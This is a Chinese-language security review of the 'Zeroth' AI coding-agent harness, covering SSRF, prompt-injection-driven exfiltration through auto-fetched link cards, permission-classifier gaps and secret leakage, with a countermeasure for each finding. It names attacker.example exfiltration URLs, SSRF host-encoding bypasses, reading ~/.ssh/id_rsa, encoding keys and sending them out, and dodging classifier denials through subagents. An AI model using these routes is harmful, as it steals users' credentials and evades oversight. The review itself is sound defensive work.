# Zeroth harness 网络与安全研究

> 范围：`src/web/`、`web_fetch`/`web_search`、链接卡片、provider 出站、MCP、权限/分类器、
> hooks/trust、subagent、bash/PTY/后台、checkpoint、rollout、图片/剪贴板、secrets、
> `ALTER_ZERO_*` 与 headless `-p`。方法：只读代码审阅 + 现有测试/文档对照，未发起真实
> 网络请求，未做扫描。行号以当前工作区（`main`，`6863f2c3` 之后）为准。严重度：P0 可被
> 模型/网页内容直接利用，P1 需配置/环境前提但影响大，P2 为纵深防御或文档漂移。
>
> **结论先行**：Zeroth 对写操作和命令有清晰门控，但对**读出站（egress）**几乎不设防。
> 默认 `auto` + 只读命令快通道 + 无门控的 `read`/`web_fetch`/链接卡片，构成“读私密数据 +
> 受不可信内容影响 + 向任意外部主机发请求”的完整链路。这是本报告最重要的结论。

## 1. 信任边界

| 对象 | 可信度 | 代码位置 | 说明 |
| --- | --- | --- | --- |
| 用户 config home（`~/.zeroth`/`ZEROTH_CONFIG_DIR`） | 可信 | `src/tui/config.rs:421-436` | providers/hooks/MCP/permissions/trust 都在此 |
| 项目 `.zeroth/`、`.mcp.json`、`AGENTS.md`、skills/agents | 不可信，按能力分级 | `docs/state/project-config.md:23-69` | hooks/MCP 审查；skills/agents/AGENTS.md 不审查 |
| 模型输出/网页/搜索结果/MCP 结果与指令 | 不可信 | `src/llm/tools.rs:584-608`、`src/mcp/instructions.rs:1-15` | web 结果有横幅，MCP 没有 |
| 进程环境（`ALTER_ZERO_*`、代理、CA） | 等价于启动者 | §3.10 | CI/direnv/父进程能改就能改边界 |
| 审查后的 hook 命令 / MCP stdio | 可信，但只钉命令字符串 | `src/trust.rs:119-260`、`docs/state/config-review.md:272-279` | 脚本内容变化不再复问 |

## 2. 网络攻击面与场景

### 2.1 SSRF：私网 / loopback / link-local

**现状.** `web_fetch` 只接受 `http(s)`，解析主机并要求每个地址全局可路由，连接钉在通过检查的地址上（`src/web/guard.rs:1-12,101-223`；`src/llm/web_exec.rs:736-768`）。字面地址即使配了代理也过闸（`src/llm/web_exec.rs:576-586`）；闸门拒绝的 URL 不会被交给救援源（`src/llm/web_exec.rs:441-453`）。

**风险.** 两处削弱：① **重定向没有逐跳复核**。`fetch_once` 只设 `timeout`/`connect_timeout` 和 `resolve`，**没有 `.redirect(...)`**（`src/llm/web_exec.rs:604-639`），reqwest 默认跟随最多 10 跳（本机 `reqwest-0.12.28/src/redirect.rs:160-164`）。公网服务器返回 `302 Location: http://169.254.169.254/...` 或 `http://127.0.0.1:...` 时客户端会自动跟过去；`GuardError::TooManyRedirects` 从未被构造（全仓仅定义，`src/web/guard.rs:50-51`），`docs/tools/web-search.md:387-394` 所称“逐跳复核”不成立。现有测试 `a_redirect_to_a_private_address_is_not_followed` 的第一跳本身就是 loopback（`tests/web_fetch.rs:249-264`），到不了重定向分支，因此通过也证明不了受控。② **配置代理时域名不再解析/过闸**（`src/llm/web_exec.rs:579-586`），只有字面 IP 仍过闸；企业代理可把内网域名转发到内网。

**对策.** `redirect::Policy::custom`：每跳 `parse_target`+重新解析/分类，拒绝非全局地址和非 80/443，最多 N 跳；或 `Policy::none()` 手工跟随。保留钉扎；代理模式加显式域名白名单。补“第一跳公网、第二跳私网”的集成测试。

### 2.2 链接卡片：只看字符串的私网判断

**现状.** 模型输出中的孤立链接会自动抓取：5 s、512 KiB HTML、仅 `text/html`、无 cookie/凭据、3 跳、封面 `image/*` 2 MiB（`src/tui/link_cards.rs:22-31,98-151,157-214`）。私网判断是纯字符串 `link_card::is_private_host`（`src/link_card.rs:109-140`），**不解析 DNS**；重定向策略也只查 `attempt.url().host_str()`（`src/tui/link_cards.rs:134-142`）。

**风险.** 漏掉 `localhost.`、`127.0.0.1.nip.io`、`0x7f000001`、`2130706433`、`[::ffff:127.0.0.1]`、`[fc00::1]`、`[fe80::1]`、`100.64.0.1`、`0.0.0.0.nip.io` 等；攻击者域名解析到 `127.0.0.1`/`10.x` 也通过。测试只覆盖点分四段 IPv4 和 `[::1]`（`src/link_card.rs:264-281`）。卡片由模型输出自动触发、无需点击，是可被提示注入驱动的**盲 SSRF/内网探测**。

**对策.** 复用 `web::guard`：解析、全地址分类、钉扎、逐跳复核、仅 80/443；补齐 IPv6 ULA/link-local、IPv4-mapped、十进制/十六进制/短写、尾点、`.internal`/`.corp`/`.home.arpa`。

### 2.3 DNS rebinding

**现状.** `web_fetch` 直连先 `resolve` 再 `ClientBuilder::resolve` 钉扎，二次 DNS 答案无法换地址（`src/llm/web_exec.rs:744-768`）；配置代理时名字交给代理；链接卡片完全不解析；provider/MCP 用普通 DNS。**风险.** 直连受钉扎保护；卡片可被 rebinding 绕过；代理模式把 SSRF 判断外包给代理。**对策.** 所有出站统一“解析→分类→钉扎”；代理模式要求显式域名列表或二次校验（fake-IP 的 `198.18/15` 只对代理连接白名单）。

### 2.4 重定向绕过（provider / header）

**现状.** `http_client` 给 provider 和普通请求使用 `Redirects::Any`（`src/llm/mod.rs:419-421,447-477`）；MCP 明确用 `SameOrigin`，因为“配置 header/API key 会随每跳发送，而 reqwest 只在跨主机时移除 `Authorization` 和 cookie”（`src/llm/mod.rs:423-436`）。**风险.** Anthropic wire 用 `x-api-key`（`src/llm/auth.rs:114-127`），部分 provider 带 `extra_headers`（`src/llm/openai.rs:500-535`）。reqwest 跨主机只移除 `Authorization`、`Cookie`、`cookie2`、`Proxy-Authorization`、`WWW-Authenticate`（`reqwest-0.12.28/src/redirect.rs:239-256`），**不剥离 `x-api-key`/自定义 header**。恶意/被攻陷 provider 返回 `307` 到攻击者主机即可取 key；MCP 已因同样原因改用 `SameOrigin`，provider 没有。**对策.** provider 聊天与 `/models` 也改 `SameOrigin`，禁止 https→http 降级，对自定义 header 做跨源剥离。

### 2.5 超大响应、慢速响应、非文本类型

**现状.** `web_fetch` 用 `REPLY_MAX_BYTES=4 MiB` 的 `Read::take`（`src/llm/web_exec.rs:22-25,266-273`），再按 `content-type` 分类：HTML 转文本、text/json/xml 直通、图片/PDF/压缩包按名拒绝（`src/web/fetch.rs:26-65`）。链接卡片 512 KiB/2 MiB；MCP 单条消息 16 MiB、错误体 64 KiB（`src/llm/mcp/transport.rs:1162-1165`）；`/models` 8 MiB（`src/llm/models.rs:1211-1216`）；工具输出 64 KiB（`src/llm/tools.rs:35-38`）。

**风险.** ① `fetch.max_chars`（默认 200_000）只被解析/校验，**从未被 `web_exec` 使用**（`src/web/rules.rs:150,525,566`；`grep max_chars src/llm/web_exec.rs` 无命中），文档所称 `Content-Length` 预检/`take(max_chars*4+1)` 不成立（`docs/tools/web-search.md:399-406`）。② `web_fetch`/`web_search` 都没有 `CancelToken` 参数（`src/llm/web_exec.rs:407-411,557-559`），慢速服务器可长期占住工具线程，Esc 只能取消回合。③ `Limiter::acquire` 预算满返回 `Granted::At`（`src/web/limiter.rs:131-156`），但 `fetch_once` 立即报错（`src/llm/web_exec.rs:587-599`），并非文档所说的 Condvar 可取消等待；它限并发，不限单请求资源。

**对策.** 读取前检查 `Content-Length`，让 `max_chars` 真正约束读取；传 `CancelToken` 并在 read/等待间轮询；预算满实现为可取消等待或 `Retry-After`。

### 2.6 追踪像素、封面图与自动外联

**现状.** 链接卡片默认开启（`ALTER_ZERO_LINK_CARDS` 为 falsy 才关，`src/tui/link_cards.rs:33-49`），对孤立 URL 自动 GET，`og:image` 再二次下载（`src/tui/link_cards.rs:121-125,157-214`）；无 cookie/凭据，但走环境代理。`web_search` 查询词发给第三方源；`web_fetch` 不抓子资源。**风险.** 模型/注入内容可输出 `https://attacker.example/collect?d=<上下文>`，客户端自动 GET，形成**不需要工具调用/权限提示的隐蔽外联**；URL 还会进入助手消息和 rollout。即使无恶意，也会向站点暴露 IP；封面是第二次外联。**对策.** 默认关闭或“本轮含不可信内容时”禁用；至少点击后抓取；域名 allowlist、端口限制、无 Referer；UI 显示“已自动请求该域名”；CI/headless 默认 `ALTER_ZERO_LINK_CARDS=0`。

### 2.7 代理与环境变量

**现状.** `web_fetch` 按 scheme 读 `HTTPS_PROXY`/`https_proxy`/`ALL_PROXY`/`all_proxy`，明确**不读 `NO_PROXY`**（`src/llm/web_exec.rs:703-734`）；provider/`/models`/MCP/卡片用 reqwest 默认代理环境。**风险.** 配置代理后 `web_fetch` 对域名不再过闸（`src/llm/web_exec.rs:576-586`）；被污染的 `HTTP_PROXY`（direnv/CI/父进程）可把所有出站（含 key/bearer）导到攻击者。忽略 `NO_PROXY` 是安全取舍，但会让“内网直连”意外走代理。**对策.** 环境变量视为启动者权限；UI 显示当前代理；对 provider/MCP 代理也做显式开关+域名白名单；CI 用 `env -i`/固定代理。

### 2.8 provider `base_url`、`api_model_base` 与凭据

**现状.** provider 文件只从 config home 读，明确不读项目 `./providers.toml`，理由是“启动能力探测会在第一帧前把 key 发到 checkout 指定的主机”（`src/tui/config.rs:60-78`；`docs/state/project-config.md:33-38`）。URL 只校验 `http(s)`（`src/llm/config.rs:661-687,733-736`），不限制私网；`api_model_base` 可与聊天 base 不同主机（`src/llm/config.rs:529-543`），而 `/models` 用同一 `request_auth` 把 key 发到该主机（`src/llm/models.rs:898-914`）。**风险.** 配置可信时这是本地模型/反代所需能力；一旦配置被改写（`ALTER_ZERO_PROVIDERS_FILE`、config home 指向仓库、dotfile 同步、供应链），可把 key 指向攻击者；`api_model_base` 的“清单主机”尤其隐蔽且启动即发，不需要用户操作。`http://` 远程主机还会让 key 明文过网，叠加 2.4 的 header 问题。**对策.** 非 loopback 的 `http://` 红字警告或拒绝；`api_model_base` 默认必须与 `api_base` 同源，跨源需显式确认；启动探测前显示目标主机；provider 改 `SameOrigin`。

### 2.9 MCP 远程服务

**现状.** 支持 stdio、streamable HTTP、legacy SSE（`src/mcp/config.rs:37-60`）。远程 `url` 只要求非空，**没有 https 强制**（`src/mcp/config.rs:522-604`），transport 直接交给 reqwest（`src/llm/mcp/transport.rs:1390-1399`）。MCP 用 `SameOrigin` 重定向（`src/llm/mod.rs:423-436`），单条消息 16 MiB。项目远程服务器禁止展开“受保护变量”，但集合只是各 provider 的 key 变量（`src/mcp/config.rs:773-801`、`src/tui/mcp.rs:112-120`）。用户 `mcp.json` 不审查（`docs/state/config-review.md:31-35`）；`ALTER_ZERO_MCP_FILE` 可把用户层指向任意文件（`src/tui/config.rs:1647-1655`）。**风险.** 被批准的项目远程 MCP 可用 `${AWS_SECRET_ACCESS_KEY}`/`${GITHUB_TOKEN}` 等（不在保护集合）填充 header，审查页只显示引用；`http://` 明文发送。stdio 继承整个环境，审查页只显示显式 env，不显示继承部分。服务器返回的 `instructions`、工具描述、工具结果进入模型上下文（`src/mcp/instructions.rs:1-15`、`src/llm/mcp/manager.rs:1411-1423`）但没有“untrusted”横幅，且批准后可改变行为。OAuth `endpoint_is_secure` 接受任意 https（含私网），`discover` 会按元数据请求 `https://10.x/...`（`src/llm/mcp/oauth.rs:898-918,1240-1318`）。**对策.** 远程强制 https（loopback 例外）；URL/OAuth 端点过网络闸门；保护变量改为“凭据形状 denylist + allowlist”；stdio 默认 `env_clear`+白名单；结果/指令加横幅并限长；按服务器+按工具审批。

### 2.10 TLS

**现状.** reqwest 用 rustls（`Cargo.toml:111`）；provider/MCP 从 `ALTER_ZERO_CA_FILE`/`SSL_CERT_FILE` 追加根证书（`src/llm/mod.rs:488-502`）；`web_fetch`/卡片各自建客户端，不加载额外根证书，也不设 `https_only`；provider/MCP/网页/卡片都允许 `http://`。**风险.** 无证书钉扎；能改环境者可加恶意根 MITM 所有 provider/MCP 流量（含 key/bearer）。`web_fetch`/卡片不认企业 CA，会失败，用户可能被迫绕过校验。**对策.** 文档明确“环境=信任边界”；远程强制 https；统一客户端工厂处理 CA；UI 显示 TLS/代理状态；不提供静默忽略证书错误。

### 2.11 凭据泄漏

**现状.** `web_search` 失败用 `transport_reason` 去掉 URL（`src/llm/web_exec.rs:359-373`）；`web_fetch` 的“不是文本”错误把完整 URL 交给模型（`src/llm/web_exec.rs:662-667`）。`format_hits`/`run_web_fetch` 有 untrusted 横幅（`src/llm/tools.rs:588-591`、`src/llm/exec.rs:1353-1356`）。secrets 展开/脱敏是精确文本匹配（`src/secrets.rs:291-303,529-708`）。**风险.** 模型可把从 `read`/`bash` 得到的原始 key 拼进 `web_fetch` URL 或 `web_search` query；这些值进入 rollout/cell/Ctrl+O，且不在 `SecretStore` 里，不会被脱敏。web 工具目前不展开 `<secret:...>`（`expands_placeholders` 不含，`src/secrets.rs:297-303`），与 `docs/tools/web-search.md:543-550` 不符；`HttpAsker::with_key` 无调用点（仅定义，`src/llm/web_exec.rs:52-58`），源 key 的 secret 接线未完成。**对策.** 对 web 工具 URL/query 做凭据形状检测/确认；`ToolStart`/rollout 前脱敏；把 provider key 纳入统一 redactor；修正文档。

## 3. 其他安全面

### 3.1 权限模式与分类器

**现状.** manual/edit/auto/master，默认 auto（`src/permission.rs:35-84`）；auto/edit 文件写入直接放行，命令/MCP 在 auto 走分类器，失败回落人工提示（`src/permission.rs:948-984`、`src/llm/approval.rs:306-343`）；headless gate unattended，需要提示的调用直接拒绝（`src/permission.rs:1371-1390`）；分类器是同一 provider 的静默 completion，不带工具（`src/llm/classifier.rs:383-461`）。

**风险.** ① `read`/`web_search`/`web_fetch`/`bashwait`/`bashkill`/`bashlist` 不在 `permission_request` 分支，直接 `_ => None` → Allow（`src/llm/approval.rs:60-199,246-249`）；`read` 可读任意绝对路径（`/home/user/.ssh/id_rsa`、`/home/user/.zeroth/.env`），web_fetch 可外发。② auto 只读快通道在分类器**之前**放行 `cat`/`base64`/`strings` 等（`src/llm/approval.rs:267-275`、`src/read_only/mod.rs:198-320`）；分类器 prompt 明确把读 `~/.ssh`/`~/.aws`/无关 `.env` 列为阻断（`prompts/classifier.md:18-26`），但 `cat /home/user/.ssh/id_rsa` 根本到不了分类器。③ auto 文件写入不过分类器、也无路径策略（`src/permission.rs:948-964`）；`write /home/user/.bashrc`、`/home/user/.ssh/authorized_keys`、`.git/hooks/pre-commit` 直接执行；`read` 也不受 cwd 限制。

**对策.** `read`/`web_*` 建立路径/域名策略；auto 写入限制 cwd（或 allowlist）并保护 `$HOME` 敏感路径；“只读”快通道与“凭据读取”解耦（`~/.ssh`、`~/.aws`、`*.pem`、`.env` 不快通）；硬规则不能只靠分类器 prompt；master/`ALTER_ZERO_PERMISSIONS=0` 红色提示+审计。

### 3.2 hooks 任意命令执行与信任审查

**现状.** hooks 用 `sh -c`，继承完整环境、cwd 为项目，有超时/取消/进程组 kill，stdin 传 JSON payload（`src/llm/hooks.rs:796-890`、`src/subprocess.rs:366-390`）。启动审查展示命令；`trust.json` 按“文件绝对路径+event+matcher+command”记录；malformed store 失败关闭且不覆盖（`src/trust.rs:1-40,119-260,692+`）；改动显示 `was:`。**风险.** 信任钉的是**命令字符串**，不是脚本内容：`./.zeroth/hooks/check.sh` 被信任后，后续提交可改脚本而不再询问（`docs/state/config-review.md:272-279`）。hooks 有 `PreToolUse.updatedInput` 可改写参数；继承环境里可能有 provider key；文件启动时读一次，会话中修改需重启审查。**对策.** 脚本/目录指纹，变化重审；审查页显示继承环境类别；`updatedInput` 可见提示；hook 子进程默认 `env_clear`+白名单。

### 3.3 MCP 进程/网络能力

**现状.** stdio 继承环境、cwd 为项目，`setsid` 隔离控制终端，进程组可整体 kill（`src/llm/mcp/transport.rs:316-350,600-640`）；用户层 MCP 不审查，项目层审查；启用后所有工具都提供，逐次调用走权限门；OAuth token 0600（`src/llm/mcp/files.rs:73-75`）；结果 64 KiB 文本截断，但第一张图片作为 data URL 直接附加，无像素/字节校验（`src/mcp/protocol.rs:760-860`）。**风险.** `npx -y @scope/server` 审查时只显示命令行，不解析/固定即将下载的包内容与解析后的版本，供应链在首次运行落地；远程 `http://` 明文、项目远程 env 保护过窄（2.9）；16 MiB 消息可被恶意服务器用接近上限的图片放大上下文/费用；描述/结果/instructions 无横幅。**对策.** 审查显示包名+版本并要求 pin；远程强制 https；env 用凭据形状 denylist；MCP 图片限 MIME/像素/字节并重编码；结果加横幅；按工具启用。

### 3.4 subagent 能力

**现状.** `tools:` 只能收窄，不能扩权；subagent 永不获得 `agent`（不嵌套）（`src/llm/tools.rs:276-303`）；`model:` 只能同 provider 换模型；subagent 共享 permission/classifier gate 和 secrets（按 `reaches_secrets`）（`src/llm/backend.rs:1415-1456`）；项目 `agents/*.md` 不审查但加载不执行（`docs/state/project-config.md:58-69`）。**风险.** 项目 agent 可在 system prompt 放任意指令，并请求 `Bash`/`Write`；auto 下文件写入直接放行、只读命令跳过分类器，实际能力接近主 agent。subagent 的 classifier context 独立，主 agent 的拒绝记录不一定影响它；换 agent 类型重试可能绕过“被拒绝”的上下文。**对策.** 项目 agent 定义审查/标记；`tools:` 默认更窄；lead 的拒绝记录共享给 subagent context；auto 下文件写入用同样的路径策略。

### 3.5 bash / PTY / 后台 / detach

**现状.** 模型命令用 PATH 上第一个绝对路径 `bash`，相对/空 PATH 项被跳过，避免项目种 `bash`（`src/subprocess.rs:108-140,704-730`）；命令经 `setsid`/helper 脱离控制终端，stdin null，stdout/stderr 管道，超时/Esc 进程组 kill（`src/subprocess.rs:1-80,400-440`）；PTY 有独立伪终端/会话/进程组，`bashsend` 输入过权限门；后台日志 0600（`src/background.rs:940-955`）。**风险.** TUI 崩溃/被 SIGKILL 时后台进程可能继续存活（`setsid` 脱离会话），可作持久化；模型发起的后台命令无人观察；`read_only` 对 `/proc/*/environ`、`ps e` 有专门防护；`env`/`printenv` 不在只读白名单，auto 下会交给分类器，但分类器仍可能放行并把导出的 key 打进输出。hooks 用 `sh`，`Command::new("sh")` 走 execvp，PATH 相对项未被绝对路径规则保护。**对策.** 退出时对所有子进程组 TERM/KILL（崩溃路径也要）；hooks 用绝对 `sh`/`bash`；`env`/`printenv` 移出快通道或输出脱敏；后台任务在 UI 标“可能仍在运行”。

### 3.6 checkpoint 的 git 操作

**现状.** 每回合 `git add -A` 到私有 `GIT_DIR`（`~/.zeroth/checkpoints`），独立 index/config，`GIT_CONFIG_NOSYSTEM`、`GIT_CONFIG_GLOBAL` 指向 store 内不存在文件，`core.hooksPath=/dev/null`、无签名、无 auto-gc（`src/checkpoint.rs:655-712`）；restore 是 `git reset --hard`+`git clean -fdq`（不带 `-x`），先备份（`src/checkpoint.rs:867-899`、`src/tui/resume.rs:404-412`）；cwd 作用域拒绝 `/`、home、`~/.zeroth`、系统/共享目录（`src/checkpoint.rs:138-410`）；`CHECKPOINT_EXCLUDES` 排除 `.git/`、`node_modules/` 等（`src/checkpoint.rs:111-124`）。**风险.** 未被 `.gitignore` 忽略的敏感文件（`.env`、`*.pem`、本地 config）会被复制进长期 store；store 目录用 `create_dir_all`，未显式 0700，git 对象通常 0444；restore 会删除所有未被忽略的未跟踪文件（备份可恢复但非无风险）；`ALTER_ZERO_CHECKPOINTS_DIR` 指向符号链接/共享目录时，`store_exclude_line` 的词法判断可能失效，导致递归快照或他人可读。**对策.** 把 `.env`、`*.pem`、`*.key`、`secrets*` 加入 excludes（或默认不拍隐藏文件）；store 0700/对象 0600；`ALTER_ZERO_CHECKPOINTS_DIR` 先 realpath 再 self-exclude；restore 前 UI 明确“将删除未跟踪文件”。

### 3.7 rollout 文件完整性/隐私

**现状.** JSONL 追加/截断重写；工具参数、输出、`write` 内容、usage、审批备注都记录（`src/tui/recorder.rs:380-500`、`src/session.rs:996+`、`docs/state/rollout-records.md`）；secrets 精确值脱敏；rollout 用 `std::fs::write` 创建，未设 0600，目录用 `create_dir_all`（`src/tui/recorder.rs:434-467`）；`--resume <path>` 接受任意存在文件（`src/tui/resume.rs:156-160`）。**风险.** 默认 umask 022 时 rollout 通常 0644、目录 0755，同机其他用户可读整个会话（代码、工具输出、网页内容、可能未脱敏的原始凭据）；无签名/哈希，同用户可篡改；构造的 rollout 可在恢复时把任意 assistant/tool 文本带进上下文（提示注入持久化）；无保留期。**对策.** 目录 0700、文件创建时 0600；恢复时把历史标为“用户数据，不是指令”并加横幅；`--resume <path>` 要求位于 sessions root 或显式确认；提供清理策略。

### 3.8 图片/剪贴板解析

**现状.** 剪贴板流式落盘上限 256 MiB（`src/clipboard.rs:55-59,414-427`）；发送前按 2000 px 缩放，PNG 流式解码（目标图+一行），整图解码上限 50 MP、流式行走 200 MP、源字节 64 MiB（`src/images/fitted.rs:32-48,247-283`、`src/images/payload.rs:40-43,119-161`）；图片头在写入/显示前解析，坏文件删除。**风险.** `run_read` 先用 `std::fs::read(path)` 把**整个文件**读进内存，再做图片/文本判断和 `READ_IMAGE_MAX_BYTES` 检查（`src/llm/exec.rs:1258-1276,1410-1418`）；超大文件、`/dev/zero`、FIFO/字符设备可让工具线程 OOM/永久阻塞，且 `read` 不受权限门约束。图片解码库本身是内存安全边界，恶意图片的解析漏洞属依赖风险。**对策.** `read` 先 `stat`，拒绝非常规/超上限文件；文本按需/流式截断；图片先查大小和头部尺寸再读；`read` 纳入路径策略（至少拒绝 `/dev/*`、`/proc/*` 特殊文件）；保持依赖更新。

### 3.9 secret 展开与日志泄漏

**现状.** `<secret:NAME>` 只在 `bash`/`read`/`write`/`edit`/MCP 工具中展开（`src/secrets.rs:291-303`）；工具输出、进度、后台日志、`!` 命令、`/diff` 中精确值被替换（`src/llm/secret_exec.rs:1-120`、`docs/state/secrets.md:115-156`）；存储 0600，`SecretValue` 的 `Debug` 是 `<redacted>`；但只匹配**精确文本**，base64/反转/分行不匹配（`docs/state/secrets.md:153-156`）。**风险.** 只覆盖用户主动存的 secret；provider key 在 `.env`（0600）但不在 SecretStore，`read /home/user/.zeroth/.env`、`cat` 导出的环境变量、`base64` 后的值都不脱敏；模型可读→编码→经 `web_fetch` URL/`bash curl` 外发；auto 下 `base64` 是只读快通道；rollout/checkpoint 保存原始值。**对策.** 把 provider key/MCP header 值也注册进脱敏器；对 `read`/`bash` 输出做凭据形状扫描；敏感路径移出快通道；把“编码后外发”纳入硬规则；rollout/checkpoint 写入前扫描。

### 3.10 `ALTER_ZERO_*` 环境变量覆盖

**现状.** 大量行为由环境变量控制，优先级通常高于文件和默认值：

| 变量 | 作用 | 位置 |
| --- | --- | --- |
| `ALTER_ZERO_PERMISSIONS=0` | 关闭权限门，所有工具不问 | `src/tui/config.rs:985-989`、`src/tui/permission.rs:67-75` |
| `ALTER_ZERO_PERMISSION_MODE` | 本次运行模式（未知值→manual） | `src/permission.rs:92-105` |
| `ALTER_ZERO_TOOLS=0` | 关闭 bash/read/write/edit | `src/llm/backend.rs:515-525` |
| `ZEROTH_CONFIG_DIR`/`ALTER_ZERO_CONFIG_DIR` | 移动整个状态目录 | `src/tui/config.rs:421-436` |
| `ALTER_ZERO_PROVIDERS_FILE` | provider 文件“独立” | `src/tui/config.rs:64-112` |
| `ALTER_ZERO_MCP_FILE` | 指定用户 MCP 文件（不审查） | `src/tui/config.rs:1647-1655` |
| `ALTER_ZERO_CA_FILE`/`SSL_CERT_FILE` | 追加根证书 | `src/llm/mod.rs:488-502` |
| `ALTER_ZERO_CLASSIFIER_MODEL` | 换分类器模型（同 provider） | `src/llm/classifier.rs:397-410` |
| `ALTER_ZERO_LINK_CARDS` | 开关自动卡片 | `src/tui/link_cards.rs:33-49` |
| `ALTER_ZERO_PROJECT_CONFIG=0` | 关闭项目层 | `src/tui/config.rs:689-695` |
| `ALTER_ZERO_SESSIONS_DIR`/`ALTER_ZERO_CHECKPOINTS_DIR` | 移动会话/快照 | `src/tui/resume.rs:202-216`、`src/checkpoint.rs:595-610` |

**风险.** 环境变量就是启动者权限，本身不是漏洞；但在 CI、direnv、共享 shell、被注入的父进程里可：关权限门、把 config home 指进仓库（让仓库的 `mcp.json`/`trust.json`/`.env` 成为用户层并跳过审查）、把 provider 指向攻击者、追加根 CA、把 sessions/checkpoints 写到共享目录。`tui::trust` 的“同一文件不重复读”守卫只覆盖 hooks 和 MCP 两个用户文件（`src/tui/trust.rs:406-416`），不覆盖 `trust.json`/`providers.toml`/`.env`。**对策.** 文档列为“启动者信任边界”；对 config home 在项目内、`ALTER_ZERO_MCP_FILE`/`ALTER_ZERO_PROVIDERS_FILE` 指向项目内红字警告或拒绝；`trust.json` 也做 identity 守卫；CI/headless 固定环境并审计变量。

### 3.11 headless `-p` 的权限默认

**现状.** 与 TUI 共用 gate，但 `set_unattended`，需要人工的调用直接拒绝（`src/tui/bootstrap.rs:257-271`、`docs/cli/headless.md:239-292`）；启动审查不显示，项目 hooks/MCP 保持 off（`src/tui/headless.rs:478-518`）；默认模式仍 auto（除非项目保存或用 `--permission-mode`），auto 下文件写入、只读命令、分类器允许的命令都会运行。**风险.** 无人值守 + 从 stdin 读 prompt（可能来自 issue/PR/网页）+ auto = 被投毒输入可写文件、执行只读命令、通过分类器允许的命令，并经 `web_fetch`/链接卡片外联；`--permission-mode master` 或 `ALTER_ZERO_PERMISSIONS=0` 在 CI 中常见，等于完全放行；stdout/stderr 会把工具名/参数/拒绝列表写进 CI 日志（`docs/cli/headless.md:350-390`）。**对策.** headless 默认改 `manual` 或要求显式 `--permission-mode`；CI 建议 manual+精确 allowlist；默认关闭 web/卡片或域名 allowlist；输出网络与拒绝审计；不要把 master 当“让 CI 跑通”的默认答案。

### 3.12 项目 `.zeroth` 配置层与启动审查边界

**现状.** 项目层读 `.zeroth/{skills,agents,hooks.json,mcp.json}` 与 `.mcp.json`；hooks/MCP 走启动审查，skills/agents 不走（加载不执行）；项目 `providers.toml`/`permissions.json`/`settings.json` 明确不读（`docs/state/project-config.md:23-69`）；`trust.json` 只在 config home，按绝对路径键控，malformed 失败关闭（`src/trust.rs:1-40`）；home 永远不是项目根（`src/trust.rs:68-76`）；`ALTER_ZERO_PROJECT_CONFIG=0` 关闭整个层。**风险.** 审查只覆盖“会立即执行”的 hooks/MCP；`AGENTS.md`/`SKILL.md`/`agents/*.md` 是提示注入面（`src/project_doc.rs:1-17` 称其为“project material, not authority”，但没有执行约束）；项目层没有 `permissions.json` 是对的，但用户若把 config home 放进仓库，用户层 `permissions.json`/`trust.json`/`mcp.json` 就变成项目可控（3.10）；“钉命令不钉脚本内容”见 3.2。**对策.** 保持项目层无 providers/permissions/settings；对 `AGENTS.md`/skills/agents 做“来自仓库、非权威”提示并限长；项目路径 realpath 归一化；审查扩展为“命令+脚本指纹+继承环境”。

## 4. 客户端 / harness 应对方法（重点）

1. **统一网络出口策略（在边界实现，不靠 prompt）.** 所有出站（web_fetch、卡片、web_search 源、provider、MCP）共用 `EgressPolicy`：仅 https（loopback 例外）、端口 80/443、每跳 DNS 解析+全地址分类+钉扎、逐跳重定向复核、最大跳数、字节/字符/时间上限、无 cookie、无默认凭据；默认拒绝私网/loopback/link-local/ULA/CGNAT/文档段，字面 IP 与域名一视同仁。
2. **默认拒绝与显式放行.** headless/CI 默认 `manual`；`auto` 只作交互式默认并显示；web 工具默认关闭或域名 allowlist；链接卡片默认关闭/点击后抓取；`master`/`ALTER_ZERO_PERMISSIONS=0` 需显式确认并记录审计。
3. **权限与数据流绑定.** `read` 纳入路径策略（保护 `~/.ssh`、`~/.aws`、`~/.zeroth`、`*.pem`、`.env`、`/proc/*/environ`、`/dev/*`）；auto 的 `write`/`edit` 限制在 cwd 或 allowlist，保护 home、`.git/hooks`、shell profile、系统目录；只读快通道与“凭据读取”解耦，分类器 prompt 的硬规则在代码里再实现一遍。
4. **不可信内容标记与隔离.** web/MCP/仓库文档/技能/agent 内容统一加 untrusted 横幅（web 已有，MCP 没有）；工具结果、instructions、AGENTS.md 不被当作指令；上下文含不可信内容时限制高风险能力（网络写、文件写、secret 展开）。
5. **项目配置/文档/技能的信任审查.** hooks/MCP 扩展脚本指纹、继承环境、包下载命令；skills/agents/AGENTS.md 显示来源与“非权威”；config home 在项目内、`ALTER_ZERO_MCP_FILE`/`ALTER_ZERO_PROVIDERS_FILE` 指向项目内时拒绝或红字确认；`trust.json` 也做 identity 守卫。
6. **MCP 审批与能力限制.** 远程强制 https；URL/OAuth 端点过网络闸门；项目远程 env 用凭据形状 denylist；stdio 默认 `env_clear`+白名单；按服务器+按工具审批；结果/描述/instructions 加横幅并限长；图片 MIME/像素/字节校验。
7. **沙箱与命令白名单.** Linux 用 Landlock/seccomp、macOS 用 Seatbelt 限制文件系统与网络（至少限制 `~/.ssh`、`~/.zeroth` 和 provider 端点之外的出站）；命令 allowlist 保持“按段前缀+exact 降级”并用真实 shell 语法做差分测试；`!`/hooks/MCP stdio 默认不继承 provider key 环境。
8. **密钥脱敏与最小化.** provider key/MCP header/web 源 key 全部进入统一 redactor；URL/query/日志做凭据形状扫描；rollout/checkpoint 写入前扫描；config home 0700、rollout 0600、checkpoint 0700/0600、scratchpad 0700。
9. **审计与回滚.** 结构化记录网络目标（域名/IP/端口/重定向）、权限决策（规则/分类器/人工）、文件写入路径、MCP/hook 启动；保留 checkpoint 恢复前备份并提供一键回滚/清理；对 master/无门控/headless 自动允许单独标记。
10. **headless 默认拒绝与可见提示.** 无 TTY 默认 manual；auto 需显式确认；项目 hooks/MCP 保持 off；输出明确哪些调用被拒、哪些网络目标被访问、哪些来自项目层；TUI footer/状态行显示权限模式、代理、网络工具开关。

## 5. 实验环境与复现

以下仅为设计，本次未执行；fixture 应在一次性容器/VM 中运行。

### 5.1 隔离的 HOME/config

```bash
TMP="$(mktemp -d)"; mkdir -p "$TMP/home" "$TMP/config" "$TMP/tmp"
export HOME="$TMP/home" ZEROTH_CONFIG_DIR="$TMP/config" TMPDIR="$TMP/tmp"
export ALTER_ZERO_SESSIONS_DIR="$TMP/config/sessions"
export ALTER_ZERO_CHECKPOINTS_DIR="$TMP/config/checkpoints"
export ALTER_ZERO_IMAGE_CACHE_MAX_BYTES=0
export ALTER_ZERO_PROJECT_CONFIG=0      # 基线：先关项目层
export ALTER_ZERO_PERMISSION_MODE=manual
